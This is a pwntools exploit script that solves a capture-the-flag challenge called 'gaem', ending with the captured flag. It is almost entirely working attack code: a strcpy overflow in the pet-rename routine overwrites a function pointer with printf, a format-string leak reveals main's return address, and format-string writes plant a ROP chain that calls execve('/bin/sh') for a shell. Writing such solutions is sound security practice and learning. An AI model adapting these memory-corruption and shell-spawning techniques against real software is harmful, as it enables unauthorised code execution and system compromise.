from pwn import *

context.arch = 'amd64'
context.bits = '64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./gaem')
gdb.attach(p, '''
    # b *0x401f15
    # b *0x402250
    continue
''')

# p = remote('challs.squ1rrel.dev', 5001)

# for each pet, there is a function pointer in the pet struct at offset 0x20
# if choosing speak to nearby pet, the function this pointer points to will be called
# besides, only if a pet is nearby, the pet can be renamed

e = ELF('./gaem')

# 1. start game
p.sendlineafter(b"Hero's name: ", b'PwnHero')

# 2. get near Whiskers (player starts at (2,2); Whiskers is at (4,4)) and rename Whiskers
# move to a place near (4,4) and choose to rename
p.sendlineafter(b"q) quit\n", b'm')
p.sendlineafter(b"> ", b'ssdr')  # s = down, d = right, r = rename
# the strcpy within the rename process can overwrite Whiskers' function pointer
# overwrite function pointer with printf@plt
p.sendlineafter(b"Whisper a new name for", b'A'*0x20+p64(e.sym['_IO_printf'])[:6])

# 3. speak to nearby pet Whiskers (Whiskers has the overwritten function pointer)
p.sendlineafter(b"q) quit\n", b't')
# leak stack address through fmtstr
p.sendlineafter(b": ", b'%15$p')
main_return_address = int(p.recvline().strip(), 16)-0x10
log.info(f"main return address: {hex(main_return_address)}")

# 4. write ROP chain to main return address through fmtstr and get shell
pop_rax = 0x00000000004309db
pop_rdi = 0x000000000040224f
binsh_addr = main_return_address-0x128
pop_rsi = 0x0000000000401abb
xor_edx_syscall = 0x000000000041478c
chain = [
    pop_rax, 0x3b,
    pop_rdi, binsh_addr,
    pop_rsi, 0,
    xor_edx_syscall
]
for i, c in enumerate(chain):
    # speak to nearby pet Whiskers for arbitrary write through fmtstr
    p.sendlineafter(b"q) quit\n", b't')
    p.sendlineafter(b": ", fmtstr_payload(offset=16, writes={main_return_address+i*8: c}, write_size='byte'))
p.sendlineafter(b"q) quit\n", b't')
p.sendlineafter(b": ", b'/bin/sh\x00')
# return from main to trigger ROP chain
p.sendlineafter(b"q) quit\n", b'q')

p.interactive()

# squ1rrel{nptl_my_beloved_y0u_m4k3_th1s_g4m3_s0_ez}